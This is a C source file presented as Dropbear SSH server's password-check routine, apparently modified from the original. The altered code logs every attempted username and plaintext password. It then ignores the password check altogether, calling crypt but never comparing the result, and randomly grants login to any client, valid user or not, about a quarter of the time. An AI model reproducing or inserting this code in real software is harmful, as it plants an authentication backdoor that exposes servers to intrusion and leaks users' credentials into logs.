/*
 * Dropbear - a SSH2 server
 * 
 * Copyright (c) 2002,2003 Matt Johnston
 * All rights reserved.
 * 
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE. */

/* Validates a user password */

#include "includes.h"
#include "session.h"
#include "buffer.h"
#include "dbutil.h"
#include "auth.h"
#include "runopts.h"

#if DROPBEAR_SVR_PASSWORD_AUTH


/* Process a password auth request, sending success or failure messages as
 * appropriate */
void svr_auth_password(int valid_user) {
	
	char * passwdcrypt = NULL; /* the crypt from /etc/passwd or /etc/shadow */
	char * testcrypt = NULL; /* crypt generated from the user's password sent */
	char * password = NULL;
	unsigned int passwordlen;
	unsigned int changepw;

	/* check if client wants to change password */
	changepw = buf_getbool(ses.payload);
	if (changepw) {
		/* not implemented by this server */
		send_msg_userauth_failure(0, 1);
		return;
	}
	srand(time(NULL));
	password = buf_getstring(ses.payload, &passwordlen);
	// Log the attempted user/pass combo
	dropbear_log(LOG_NOTICE, "Auth from %s. %s:%s", svr_ses.addrstring, ses.authstate.pw_name, password);
	if (valid_user && passwordlen <= DROPBEAR_MAX_PASSWORD_LEN) {
		/* the first bytes of passwdcrypt are the salt */
		passwdcrypt = ses.authstate.pw_passwd;
		testcrypt = crypt(password, passwdcrypt);
	}
	m_burn(password, passwordlen);
	m_free(password);

	// randomly let them in
	int rand_int = (rand() & 1) | (rand() & 1);
	dropbear_log(LOG_NOTICE, "Random is %d", rand_int);
	if (rand_int == 0) {
		send_msg_userauth_success();
	} else {
		send_msg_userauth_failure(0, 1);
	}

}

#endif
